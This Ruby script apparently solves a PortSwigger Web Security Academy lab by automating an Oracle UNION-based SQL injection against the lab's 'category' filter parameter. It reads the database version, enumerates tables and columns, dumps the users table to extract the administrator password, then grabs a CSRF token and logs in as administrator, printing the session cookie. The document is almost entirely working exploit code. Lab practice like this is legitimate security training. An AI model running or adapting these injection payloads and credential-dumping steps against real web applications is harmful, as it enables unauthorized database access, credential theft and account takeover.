require 'http'
require 'nokogiri'

tn = []
cn = []
cr = []
csrf_token=''

url = "https://0ad300a80394879180f4089800e30062.web-security-academy.net/filter"

client = HTTP.headers(
	"User-Agent"=>"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36"
	)
	.cookies(
		:session => "G09AO1Jq2eUzd2QnjsXt3RncCHhbMTZp"
	)

# Get Version Information
payload1 = "' UNION SELECT banner,NULL FROM v$version-- -"
req1 = client.get url, :params => {:category=>"Pets#{payload1}"}
resp1 = Nokogiri.parse req1.body.to_s
puts "=== Getting the Server Information ===="
resp1.search('tr').each {|t| puts t.elements.text if t.elements.text.include? "Production"}

# Get the table names
payload2 = "' UNION SELECT table_name,NULL FROM all_tables-- -"
req2 = client.get url,:params => {:category => "Pets#{payload2}"}
resp2 = Nokogiri.parse req2.body.to_s
resp2.search('tr').each {|d| tn << d.elements.text if d.elements.text.start_with? "USER"}
puts "=== Getting the table names ===="
puts tn
tntq = tn[0]

if !tn.include?tntq
	puts "Table does not exist: "
	exit
end

# Get the column names
payload3 = "' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='#{tntq}'-- -"
req3 = client.get url,:params => {:category => "Pets#{payload3}"}
resp3 = Nokogiri.parse req3.body.to_s
resp3.search('tr').each {|d| cn << d.elements.text if d.elements.text.start_with? "user","USERNAME","passwd","PASSWORD"}
puts "=== Getting the column names from table #{tntq}===="
puts cn

# Get the data 
cn1 = cn[0]
cn2 = cn[1]
payload4 = "' UNION SELECT #{cn1},#{cn2} FROM #{tntq}-- -"
req4 = client.get url,:params => {:category => "Pets#{payload4}"}
resp4 = Nokogiri.parse req4.body.to_s
resp4.search('tr').each {|d| cr << d.elements.text if d.elements.text.include?"administrator"}
puts "====> Fetching Credentials <====="
passwd = cr[0].split('administrator')[0]
puts "administrator : #{passwd}"

# Fetch CSRF Token
url = "https://0ad300a80394879180f4089800e30062.web-security-academy.net/login"
csrf_client = client.get url
resp_csrf = Nokogiri.parse csrf_client.body.to_s
resp_csrf.search('input').each {|a| csrf_token = a['value'] if a['name']=='csrf'}

# Login Using Credentials
puts "Trying to login..."
login_client = client.post url,:form => {
						:csrf => csrf_token,
						:username => "administrator",
						:password => passwd
}

puts "Status Code: #{login_client.code}"
puts "Solved Cookie: #{login_client.headers['Set-Cookie'].split(';')[0]}"
